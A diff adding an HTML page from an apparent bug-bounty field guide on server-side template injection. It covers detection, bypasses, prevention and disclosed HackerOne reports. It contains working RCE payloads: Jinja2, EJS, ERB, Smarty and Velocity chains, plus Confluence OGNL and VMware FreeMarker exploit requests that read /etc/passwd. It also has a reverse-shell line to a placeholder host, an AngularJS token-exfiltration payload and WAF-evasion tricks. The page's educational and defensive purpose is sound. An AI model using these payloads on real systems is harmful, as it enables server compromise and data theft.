@@ -1,0 +1,345 @@
+<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Server-Side Template Injection · The Hacktivity Field Guide</title>
+<meta name="description" content="">
+<link rel="icon" href="/favicon.jpg">
+<script>try{var t=localStorage.getItem('fg-theme');if(t)document.documentElement.setAttribute('data-theme',t);}catch(e){}</script>
+<link rel="stylesheet" href="../assets/style.css">
+<script>window.SITE_ROOT="../";</script>
+</head><body>
+<div class="ethics" id="ethics"><b>⚠ Authorized testing only.</b> Disclosed public bug-bounty data for defensive/educational research. Use payloads only against systems you are permitted to test. <button id="ethicsX">Dismiss</button></div>
+<div class="top">
+  <button class="hamb" id="hamb" aria-label="Open navigation">☰</button>
+  <a class="brand" href="../index.html"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide<small>Real-world web hacking, catalogued</small></span></a>
+  <a class="tbtn" href="/" aria-label="Main site" title="Gill.Singh.A" style="text-decoration:none">⌂</a><div class="searchwrap"><span class="mag">🔎</span><input id="q" type="search" placeholder="Search techniques, programs, report IDs…" autocomplete="off" aria-label="Search"><div class="results" id="results"></div></div>
+  <button class="tbtn" id="themeBtn" aria-label="Toggle light/dark">◐</button>
+</div>
+<div class="crumb"><a href="../index.html">Field Guide</a><span class="sep">/</span><b>Vulnerabilities</b><span class="sep">/</span><b>Server-Side Template Injection</b></div>
+<div class="shell">
+  <aside class="side" id="side" aria-label="Taxonomy"><div class="nav">
+<a class="navhome" href="../index.html">⌂ Home</a>
+<div class="nav-h">Methodology</div>
+<a href="../methodology/recon.html">Recon</a>
+<a href="../methodology/choosing-targets.html">Choosing targets</a>
+<a href="../methodology/triage-and-impact.html">Triage & impact</a>
+<a href="../methodology/reporting.html">Reporting</a>
+<div class="nav-h">Injection</div>
+<a class="" href="../vulnerabilities/sqli.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>SQL Injection<span class="n">122</span></a>
+<a class="" href="../vulnerabilities/command-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>OS Command Injection<span class="n">85</span></a>
+<a class="" href="../vulnerabilities/code-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Code Injection<span class="n">86</span></a>
+<a class="on" href="../vulnerabilities/ssti.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Template Injection<span class="n">14</span></a>
+<a class="" href="../vulnerabilities/injection-other.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>LDAP / XML / Other Injection<span class="n">77</span></a>
+<a class="" href="../vulnerabilities/crlf-http-splitting.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>CRLF / HTTP Response Splitting<span class="n">22</span></a>
+<a class="" href="../vulnerabilities/xxe.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>XML External Entities (XXE)<span class="n">25</span></a>
+<a class="" href="../vulnerabilities/rfi.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Remote File Inclusion<span class="n">4</span></a>
+<div class="nav-h">Client-side</div>
+<a class="" href="../vulnerabilities/xss.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Scripting (XSS)<span class="n">936</span></a>
+<a class="" href="../vulnerabilities/csrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Request Forgery (CSRF)<span class="n">144</span></a>
+<a class="" href="../vulnerabilities/clickjacking.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Clickjacking<span class="n">20</span></a>
+<a class="" href="../vulnerabilities/open-redirect.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Open Redirect<span class="n">151</span></a>
+<a class="" href="../vulnerabilities/spoofing-phishing.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Content Spoofing &amp; Phishing<span class="n">74</span></a>
+<div class="nav-h">Access control</div>
+<a class="" href="../vulnerabilities/idor.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>IDOR / BOLA<span class="n">248</span></a>
+<a class="" href="../vulnerabilities/access-control.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Broken Access Control<span class="n">494</span></a>
+<a class="" href="../vulnerabilities/privilege-escalation.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Privilege Escalation<span class="n">88</span></a>
+<a class="" href="../vulnerabilities/mass-assignment.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Mass Assignment<span class="n">16</span></a>
+<div class="nav-h">Auth & session</div>
+<a class="" href="../vulnerabilities/auth.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Authentication &amp; ATO<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/session.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Session Management<span class="n">61</span></a>
+<div class="nav-h">Server-side</div>
+<a class="" href="../vulnerabilities/ssrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Request Forgery (SSRF)<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/path-traversal.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Path Traversal / LFI<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/deserialization.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Insecure Deserialization<span class="n">69</span></a>
+<a class="" href="../vulnerabilities/request-smuggling.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>HTTP Request Smuggling<span class="n">33</span></a>
+<a class="" href="../vulnerabilities/cache.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Web Cache Poisoning &amp; Deception<span class="n">36</span></a>
+<a class="" href="../attack-surface/file-upload.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>File Upload<span class="n">66</span></a>
+<div class="nav-h">Logic & infra</div>
+<a class="" href="../vulnerabilities/business-logic.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Business Logic Flaws<span class="n">267</span></a>
+<a class="" href="../vulnerabilities/race-condition.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Race Conditions<span class="n">42</span></a>
+<a class="" href="../vulnerabilities/dos-resource.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Denial of Service<span class="n">296</span></a>
+<a class="" href="../vulnerabilities/misconfiguration.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Security Misconfiguration<span class="n">119</span></a>
+<a class="" href="../vulnerabilities/unclassified.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Protocol, Config &amp; Infra Injection (long tail)<span class="n">218</span></a>
+<a class="" href="../vulnerabilities/supply-chain.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Supply Chain &amp; Malicious Code<span class="n">31</span></a>
+<a class="" href="../vulnerabilities/logging.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Logging &amp; Monitoring Failures<span class="n">14</span></a>
+<div class="nav-h">Disclosure & crypto</div>
+<a class="" href="../vulnerabilities/info-disclosure.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Information Disclosure<span class="n">568</span></a>
+<a class="" href="../vulnerabilities/crypto.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cryptographic Issues<span class="n">91</span></a>
+<a class="" href="../vulnerabilities/mitm.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Man-in-the-Middle<span class="n">12</span></a>
+<div class="nav-h">Binary</div>
+<a class="" href="../vulnerabilities/memory-corruption.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Memory Corruption<span class="n">324</span></a>
+<div class="nav-h">Emerging</div>
+<a class="" href="../vulnerabilities/llm-ai.html"><span class="dot" style="background:var(--sev-med)" title="Medium"></span>LLM / AI Attacks<span class="n">3</span></a>
+<div class="nav-h">Attack surface</div>
+<a class="" href="../attack-surface/graphql.html">GraphQL<span class="n">42</span></a>
+<a class="" href="../attack-surface/oauth.html">OAuth 2.0 / OIDC<span class="n">62</span></a>
+<a class="" href="../attack-surface/jwt.html">JSON Web Tokens (JWT)<span class="n">10</span></a>
+<a class="" href="../attack-surface/saml.html">SAML<span class="n">5</span></a>
+<a class="" href="../attack-surface/cors.html">CORS Misconfiguration<span class="n">22</span></a>
+<a class="" href="../attack-surface/subdomain-takeover.html">Subdomain Takeover<span class="n">121</span></a>
+<a class="" href="../attack-surface/account-takeover.html">Account Takeover Chains<span class="n">101</span></a>
+<a class="" href="../attack-surface/file-upload.html">File Upload<span class="n">66</span></a>
+<a class="" href="../attack-surface/cloud-aws.html">Cloud Metadata &amp; Keys</a>
+<a class="" href="../attack-surface/webhooks.html">Webhooks &amp; Integrations</a>
+<a class="" href="../attack-surface/mobile.html">Mobile &amp; Thick-Client</a>
+<div class="nav-h">Field notes</div>
+<a href="../chains.html">Exploit chains</a><a href="../payloads.html">Payload libraries</a>
+</div></aside>
+  <main class="main">
+    <header class="entry-head">
+      <div class="kicker"><span class="dot" style="background:var(--sev-crit)"></span>Vulnerabilities</div>
+      <h1>Server-Side Template Injection</h1>
+      <div class="meta-row"><span class="chip">Specimens <b>14</b></span><a class="chip lab" href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener">⚑ Practice — PortSwigger: <b>Server-side template injection</b></a></div>
+    </header>
+    <div class="thin-note">⚠ Thin coverage — only 14 disclosed reports for this class; illustrative, not exhaustive.</div>
+    <h2 class="sec" id="basic-information"><span class="tick">§</span>Basic information</h2>
+<p>Server-Side Template Injection (SSTI) happens when user input reaches a template engine's <strong>compile/eval path</strong> instead of its data path — so your string is parsed as <em>template code</em> and executed on the server, not rendered as an inert value. Engines mix a text template with a data context; the bug is feeding attacker text into the template half.</p>
+<p>Because the template language exposes the host runtime (Python objects, the Node <code>require</code> graph, Java classes, PHP <code>{php}</code>), SSTI is a short hop from "my string renders" to "my code runs". Treat it as a near-universal <strong>RCE primitive</strong> — file read, command execution, full server compromise — not a reflection curiosity. Its client-side cousin <strong>CSTI</strong> (an AngularJS <code>{{7*7}}</code> that evaluates in the browser) shares the exact detection reflex and sandbox-escape mechanics, so it lives here too.</p>
+<h2 class="sec" id="methodology"><span class="tick">§</span>Methodology</h2>
+<ol><li><strong>Map inputs → template sinks.</strong> For every field, header, and JSON/GraphQL value, find where it is later <em>rendered</em>. The high-value pattern is <strong>second-order</strong>: a value stored on one surface (profile name) rendered by a template on another (the welcome email).</li><li><strong>Fire the arithmetic canary</strong> in each engine's delimiters. Data renders it literally; a template engine <em>computes</em> it. <code>{{7*7}}</code> → <code>49</code> is the whole tell.</li><li><strong>Fingerprint the engine</strong> from which delimiter fired, then a language probe (<code>{{'7'*7}}</code> for Python, <code>{$smarty.version}</code> for Smarty, <code>{{this}}</code> for JS engines).</li><li><strong>Escalate along that engine's runtime</strong> — Python <code>__subclasses__()</code> → <code>Popen</code>, JS <code>__proto__.constructor</code> → <code>require</code>, Java expression-language → <code>ScriptEngineManager</code> → <code>ProcessBuilder</code>.</li><li>For <strong>blind / second-order</strong>, plant the probe and wait for the out-of-band render (email subject/body, error page, PDF). Check the delivered artifact, not the HTTP response.</li></ol>
+<div class="pre" data-lang="http"># One canary that tells XSS from SSTI in a single shot
+kZ9x"'&lt;&gt;{{7*7}}${7*7}#{7*7}
+# {{7*7}}/49 -&gt; template engine (SSTI/CSTI); "'&lt;&gt; reflected raw -&gt; pivot to XSS instead.</div>
+<h2 class="sec" id="detection-fingerprinting"><span class="tick">§</span>Detection &amp; fingerprinting</h2>
+<p>Send the fingerprint set and see which delimiter evaluates — that names the engine family.</p>
+<div style="overflow-x:auto"><table class="bx"><thead><tr><th>Probe</th><th>Result</th><th>Engine</th></tr></thead><tbody><tr><td><code>{{7*7}}</code></td><td><code>49</code></td><td>Jinja2 · Twig · Nunjucks · Angular (CSTI)</td></tr><tr><td><code>{7*7}</code></td><td><code>49</code></td><td>Smarty</td></tr><tr><td><code>${7*7}</code></td><td><code>49</code></td><td>FreeMarker · JSP EL</td></tr><tr><td><code>&lt;%= 7*7 %&gt;</code></td><td><code>49</code></td><td>ERB · EJS</td></tr><tr><td><code>#{7*7}</code></td><td><code>49</code></td><td>Pug · Ruby string interp</td></tr><tr><td><code>{{'7'*7}}</code></td><td><code>7777777</code></td><td>Jinja2 (string-multiply → Python, not Twig)</td></tr><tr><td><code>{{this}}</code></td><td><code>[object Object]</code></td><td>Handlebars / other JS engines (no arithmetic — probe with <code>{{this}}</code>, not <code>{{7*7}}</code>)</td></tr><tr><td><code>[[7*7]]</code></td><td><code>49</code></td><td>AngularJS with remapped interpolation delimiters</td></tr></tbody></table></div>
+<p>Once a delimiter fires, confirm the exact engine before firing gadgets — the escalation path is engine-specific:</p>
+<div class="pre" data-lang="jinja">{{ '7'*7 }}                          {# 7777777 -&gt; Jinja2 / Python #}</div>
+<div class="pre" data-lang="html">{{this}}                             &lt;!-- [object Object] -&gt; server-side JS templating --&gt;
+{{this.__proto__.constructor.name}}  &lt;!-- Object -&gt; NodeJS confirmed --&gt;</div>
+<div class="pre" data-lang="smarty">{$smarty.version}                    {* 3.x.x -&gt; Smarty, and {php} tags may be live *}</div>
+<div class="callout note"><span class="ico">● NOTE</span><div><strong>Blind / second-order is the default, not the exception.</strong> The corpus SSTI wins mostly render in an <em>outbound email</em>, not the page you posted to. Register with <code>{{7*7}}</code> as your first name and wait — a subject line arriving as <code>49, welcome...</code> is the confirmation (<code>#1104349</code>, <code>#125980</code>, <code>#164224</code>). Sometimes output surfaces only in an HTTP 400 <strong>error page</strong> or an embedded <code>console.log</code>, never the normal body (<code>#1537543</code>).</div></div>
+<h2 class="sec" id="technique-variants"><span class="tick">§</span>Technique variants</h2>
+<p>Group by engine family — each exposes the host runtime differently.</p>
+<h3 class="sub" id="python-jinja2-twig-style">Python — Jinja2 / Twig-style <code>{{ }}</code></h3>
+<p>Walk the class hierarchy from any built-in object up to <code>object</code>, then down to a subclass that wraps <code>os</code>/<code>subprocess</code>, and call it.</p>
+<div class="pre" data-lang="jinja">{{ [].__class__.__base__.__subclasses__() }}
+{{ ''.__class__.mro()[1].__subclasses__() }}
+{# index the Popen subclass and run a command: #}
+{{ ''.__class__.mro()[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}</div>
+<h3 class="sub" id="nodejs-handlebars-pug-ejs">NodeJS — Handlebars / Pug / EJS</h3>
+<p>JS engines reach code execution by traversing the prototype chain to <code>constructor</code> → <code>require('child_process')</code>. When the framework compiles a <strong>raw request string</strong> as a template, it is immediate RCE.</p>
+<div class="pre" data-lang="html">{{this.__proto__.constructor.name}}   &lt;!-- Object -&gt; escalate via constructor -&gt; require --&gt;</div>
+<div class="pre" data-lang="js">// @fastify/view reply.view({raw}) or Rails-style raw EJS: request string -&gt; compile()
+&lt;%= require("child_process").execSync("id").toString() %&gt;
+&lt;%= require("child_process").execSync("bash -i &gt;&amp; /dev/tcp/COLLAB/4444 0&gt;&amp;1") %&gt;</div>
+<h3 class="sub" id="ruby-erb-render-inline">Ruby — ERB (<code>render inline:</code>)</h3>
+<p>Any request-derived string reaching <code>render inline:</code> / <code>ERB.new</code> compiles as ERB, so backtick shell-out executes.</p>
+<div class="pre" data-lang="erb">&lt;% `touch me` %&gt;
+&lt;%= system("id") %&gt;</div>
+<p>Send it url-encoded where the field is passed on a query string: <code>%3C%25%20%60touch%20me%60%20%25%3E</code>.</p>
+<h3 class="sub" id="php-smarty-php">PHP — Smarty <code>{php}</code></h3>
+<p>When <code>{php}</code> tags (or insecure modifiers) are enabled, raw PHP inside the template runs — file read and RCE.</p>
+<div class="pre" data-lang="smarty">{$smarty.version}
+{php}$s = file_get_contents('/etc/passwd',NULL,NULL,0,100); var_dump($s);{/php}</div>
+<h3 class="sub" id="java-freemarker-velocity-ognl">Java — FreeMarker / Velocity / OGNL</h3>
+<p>The JVM engines pivot into <code>Runtime</code>/<code>ProcessBuilder</code>, often via a scripting engine. Command output is usually reflected inline, so these are blind-free RCE.</p>
+<div class="pre" data-lang="bash"># FreeMarker Execute gadget (VMware Workspace ONE deviceUdid, CVE-2022-22954)
+GET /catalog-portal/ui/oauth/verify?error=&amp;deviceUdid=${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
+
+# Velocity reflection -&gt; Runtime.exec (unauthenticated Apache Solr, wt=velocity)
+# $x must be defined first (#set($x='')) so $x.class.forName(...) resolves
+GET /solr/CORE/select?q=1&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)%23set($rt=$x.class.forName(%27java.lang.Runtime%27))%20$rt.getRuntime().exec(%27id%27)
+
+# OGNL -&gt; ScriptEngineManager('JavaScript') -&gt; ProcessBuilder (Confluence CVE-2021-26084)
+# single quotes are Unicode-escaped to slip the OGNL keyword/WAF filter — send exactly this escaped form
+queryString=aaa\u0027%2b{Class.forName(\u0027javax.script.ScriptEngineManager\u0027).newInstance().getEngineByName(\u0027JavaScript\u0027).\u0065val(\u0027var p=new java.lang.ProcessBuilder();p.command(\u0022bash\u0022,\u0022-c\u0022,\u0022cat /etc/passwd\u0022);p.redirectErrorStream(true);p.start()\u0027)}%2b\u0027</div>
+<h3 class="sub" id="client-side-angularjs-csti">Client-side — AngularJS (CSTI)</h3>
+<p>Angular evaluates <code>{{ }}</code> in the browser against <code>$scope</code>. Escape the expression sandbox (version-specific) to run arbitrary JS, or — even <em>inside</em> the sandbox — read <code>$scope</code> and leak it through any request-issuing attribute.</p>
+<div class="pre" data-lang="js">// AngularJS 1.1.5 sandbox escape (delimiters remapped to [[ ]] here)
+[[constructor.constructor('alert(document.cookie)')()]]
+// No JS-exec needed: walk the scope, exfiltrate via an image GET
+// {{7*7}} confirms; then read $$childHead/$$nextSibling and set a victim avatar src to //COLLAB/?d=&lt;token&gt;</div>
+<div class="callout tip"><span class="ico">▸ TIP</span><div><strong>Enumerate the object graph before guessing gadgets.</strong> In Ruby/Liquid, probes like <code>{{ class }}</code>, <code>{{ methods | json }}</code>, and especially <code>{{ to_yaml }}</code> dump exposed methods and <em>hidden</em> fields (password hashes the UI never shows) — info disclosure short of RCE, but often enough to escalate (<code>#98259</code>).</div></div>
+<h2 class="sec" id="bypasses"><span class="tick">§</span>Bypasses</h2>
+<div style="overflow-x:auto"><table class="bx"><thead><tr><th>Filter / control</th><th>Bypass</th><th>Seen in</th></tr></thead><tbody><tr><td>Keyword/WAF filter on OGNL tokens</td><td>Unicode-escape the quotes and keyword (<code>\u0027</code>, <code>\u0065val</code>) to slip the blocklist</td><td>#1327701</td></tr><tr><td>No direct class reference allowed</td><td>Velocity reflection <code>$x.class.forName('java.lang.Runtime')</code> reaches <code>Runtime.exec</code></td><td>#822002</td></tr><tr><td>Python dunder/keyword blocklist</td><td>Walk <code>__class__.mro()[1].__subclasses__()</code> instead of a blocked <code>__globals__</code></td><td>#125980</td></tr><tr><td>Input length limit on the field</td><td>Pick a short subclass index / minimal gadget so the payload survives truncation</td><td>#125980</td></tr><tr><td>Output stripped from response body</td><td>Read command output from the HTTP 400 error page + embedded <code>console.log</code></td><td>#1537543</td></tr><tr><td>"Only files can be templates" assumption</td><td><code>reply.view({raw:...})</code> / <code>render inline:</code> compiles a <em>string</em>, not a file</td><td>#3122019</td></tr><tr><td>Angular HTML output-encoding</td><td>Sandbox escape <code>constructor.constructor(...)</code> runs JS despite entity-encoding</td><td>#141463</td></tr><tr><td>Sandbox blocks JS execution</td><td>Exfiltrate <code>$scope</code> via an image-<code>src</code> GET side channel, no code-exec needed</td><td>#271960</td></tr><tr><td>Hidden/filtered object fields</td><td>Liquid <code>{{ to_yaml }}</code> serializes attributes the UI hides</td><td>#98259</td></tr></tbody></table></div>
+<div class="callout warn"><span class="ico">▲ WARNING</span><div><code>{{7*7}}</code> → <code>77</code> (concatenation) or the string echoed <strong>literally</strong> means you are <em>not</em> in a template engine — that is a reflected-XSS candidate, not SSTI. Don't report SSTI off a <code>49</code> you got by pasting into a client-side Angular field either: confirm whether evaluation is server-side (check the outbound email/PDF) or browser-side (CSTI) before you claim RCE.</div></div>
+<h2 class="sec" id="escalation-impact"><span class="tick">§</span>Escalation &amp; impact</h2>
+<p>SSTI is usually the endpoint, not a step — it <strong>is</strong> the RCE. Two escalation shapes recur:</p>
+<ul><li><strong>Engine → host runtime → RCE.</strong> JS engines walk <code>__proto__.constructor</code> to <code>require('child_process')</code> (<code>#423541</code>, <code>#3122019</code>); Python walks <code>__subclasses__()</code> to <code>Popen</code> (<code>#125980</code>); Java expression-languages pivot through <code>ScriptEngineManager('JavaScript')</code> into <code>ProcessBuilder</code> (<code>#1327769</code>), or Velocity reflects on <code>java.lang.Runtime</code> (<code>#822002</code>). Unauth product CVEs (VMware FreeMarker, Confluence OGNL, Solr Velocity) turn a fingerprint into pre-auth server compromise.</li><li><strong>CSTI → XSS → ATO.</strong> A stored Angular expression viewed by an admin steals the session for full account takeover (<code>#141463</code>); or read <code>$scope</code> and leak other users' tokens with no XSS at all (<code>#271960</code>). See the sibling <strong>XSS</strong> page for the sandbox-escape and delivery mechanics.</li><li><strong>Info disclosure short of RCE.</strong> Liquid <code>to_yaml</code> / method enumeration dumps hidden fields even where the engine is sandboxed against exec (<code>#98259</code>).</li></ul>
+<h2 class="sec" id="prevention"><span class="tick">§</span>Prevention</h2>
+<ul><li><strong>Never render user input as a template.</strong> Pass it as a <em>context variable</em> into a pre-authored template so <code>{{7*7}}</code> displays literally. <code>render inline: params[...]</code> and <code>reply.view({raw})</code> fed by request data are the bug itself.</li><li><strong>Sandbox and lock down the engine</strong>: Jinja2 <code>SandboxedEnvironment</code>, disable Smarty <code>{php}</code> and insecure modifiers, remove Solr's <code>VelocityResponseWriter</code>/DIH, keep FreeMarker/OGNL products patched to the CVE fix.</li><li><strong>Remember async sinks</strong>: a profile field that only ever reaches a mail template must still be treated as untrusted at mail-generation time — that is where the render happens.</li><li><strong>CSTI</strong>: mark user-data regions <code>ng-non-bindable</code> and upgrade off sandbox-broken AngularJS. A field where <code>{{7*7}}</code> renders literally with no surrounding <code>ng-*</code> binding is not exploitable.</li></ul>
+<h2 class="sec" id="tools"><span class="tick">§</span>Tools</h2>
+<ul><li><strong>tplmap</strong> — engine fingerprinting and automated exploitation across Jinja2/ERB/FreeMarker/Velocity/Smarty.</li><li><strong>Burp Repeater/Intruder</strong> — fire the fingerprint set and drive second-order probing (submit → open the email).</li><li><strong>Burp Collaborator / any canary host</strong> — for blind SSTI where output lands in an email or error page.</li><li><strong>Browser DevTools console</strong> — <code>angular.version</code>, <code>$scope</code> walking, and sandbox-escape testing for CSTI.</li><li><strong>Source-code grep</strong> — <code>render inline:</code>, <code>ERB.new</code>, <code>compile(</code>, <code>renderString</code>, <code>reply.view({raw</code> fed by request data.</li></ul>
+    <h2 class="sec" id="specimens"><span class="tick">✦</span>Specimens — real-world examples</h2>
+    <p>The techniques above are the general method. Below, each disclosed HackerOne report is a catalogued example — concrete payload, outcome, and matching practice lab. <b>14</b> in this class.</p>
+    <div class="sortbar"><label for="sort">Sort specimens:</label>
+      <select id="sort"><option value="score">Best first</option><option value="votes">Most votes</option><option value="bounty">Highest bounty</option><option value="sev">Severity</option></select>
+      <span style="margin-left:auto;color:var(--muted);font-size:12px" id="showing"></span></div>
+    <div class="specimens" id="specimens"><article class="spec" id="report-1327769" style="--sv:var(--sev-crit)" data-sev="4" data-votes="39" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Confluence OGNL injection to RCE (CVE-2021-26084)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1327769</b> · deptofdefense · none · 39 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">doenterpagevariables.action evaluates the queryString value as OGNL; the expression instantiates a JS ScriptEngine and runs ProcessBuilder, giving RCE. Reachable unauthenticated when user signup is enabled.</p>
+<h4>Method</h4><ol><li>POST to /pages/doenterpagevariables.action with an OGNL payload in queryString</li><li>OGNL builds a JavaScript ScriptEngine and runs an OS command via ProcessBuilder</li><li>Command output is reflected in the response value attribute</li></ol>
+<div class="pre">queryString=aaa\u0027%2b{Class.forName(\u0027javax.script.ScriptEngineManager\u0027).newInstance().getEngineByName(\u0027JavaScript\u0027).eval(\u0027var p=new java.lang.ProcessBuilder(); p.command(\u0022bash\u0022,\u0022-c\u0022,\u0022cat /etc/passwd\u0022); ...\u0027)}%2b\u0027</div>
+<p class="insight"><b>Insight —</b> Expression-language injection (OGNL/SpEL/MVEL) escalates to RCE by pivoting through a scripting engine (ScriptEngineManager JavaScript) into ProcessBuilder; \u00XX-encode dots/quotes to slip past keyword filters.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1327769" target="_blank" rel="noopener">hackerone.com/reports/1327769</a></span><a class="src" href="#report-1327769" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-822002" style="--sv:var(--sev-crit)" data-sev="4" data-votes="24" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Apache Solr unauth RCE via Velocity template injection</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#822002</b> · deptofdefense · none · 24 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An exposed, unauthenticated Solr instance with the VelocityResponseWriter enabled lets a query supply an inline Velocity template (v.template.custom), which is rendered server-side and can reach java.lang.Runtime for command execution.</p>
+<h4>Method</h4><ol><li>Find an internet-exposed Solr with no auth (port scan; /solr/ open)</li><li>Confirm data access with q=*:*</li><li>Enable/abuse wt=velocity and pass v.template.custom with a Velocity payload that reflects on java.lang.Runtime to exec commands</li></ol>
+<div class="pre">GET /solr/CORE/select?q=1&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)%20%23set($rt=$x.class.forName(%27java.lang.Runtime%27))%20%23set($chr=$x.class.forName(%27java.lang.Character%27))%20%23set($str=$x.class.forName(%27java.lang.String%27))%20%23set($ex=$rt.getRuntime().exec(%27id%27))%20$ex.waitFor()%20%23set($out=$ex.getInputStream())%20%23foreach($i%20in%20[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1</div>
+<p class="insight"><b>Insight —</b> Unauthenticated Solr is a recurring RCE surface: Velocity template injection (VelocityResponseWriter) and the DataImportHandler script sink both give command exec. Always port-scan for Solr and test wt=velocity plus DIH.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/822002" target="_blank" rel="noopener">hackerone.com/reports/822002</a></span><a class="src" href="#report-822002" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1327701" style="--sv:var(--sev-crit)" data-sev="4" data-votes="18" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Confluence OGNL injection RCE (CVE-2021-26084)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1327701</b> · deptofdefense · none · 18 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The Confluence createpage-entervariables endpoint evaluates the queryString parameter as an OGNL expression, allowing an unauthenticated (when signup enabled) attacker to build a ScriptEngineManager/ProcessBuilder chain and run OS commands.</p>
+<h4>Method</h4><ol><li>POST to /pages/createpage-entervariables.action?SpaceKey=x with an OGNL payload in queryString</li><li>The payload builds a JavaScript ScriptEngine that runs ProcessBuilder with your command</li><li>Command output is reflected back in the response value= attribute</li></ol>
+<div class="pre">POST /pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+queryString=aaaaaaaa\u0027%2b{Class.forName(\u0027javax.script.ScriptEngineManager\u0027).newInstance().getEngineByName(\u0027JavaScript\u0027).\u0065val(\u0027var cmd=new java.lang.String(\u0022cat /etc/passwd\u0022);var p=new java.lang.ProcessBuilder();p.command(\u0022bash\u0022,\u0022-c\u0022,cmd);p.redirectErrorStream(true);var pr=p.start();...\u0027)}%2b\u0027</div>
+<p class="insight"><b>Insight —</b> OGNL/expression-language sinks reflect command output in the response, so they double as blind-free RCE. Unicode-escape sensitive tokens (\u0027, \u0065val) to slip past keyword/WAF filters.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1327701" target="_blank" rel="noopener">hackerone.com/reports/1327701</a></span><a class="src" href="#report-1327701" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/server-side-template-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1537543" style="--sv:var(--sev-crit)" data-sev="4" data-votes="6" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>VMware Workspace ONE FreeMarker SSTI (CVE-2022-22954)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1537543</b> · deptofdefense · none · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Chain <b>unauth SSTI -&gt; FreeMarker Execute -&gt; RCE / file read</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Unauthenticated FreeMarker server-side template injection in the Workspace ONE Access / Identity Manager catalog-portal: the deviceUdid parameter is evaluated as a template, allowing freemarker.template.utility.Execute to run OS commands.</p>
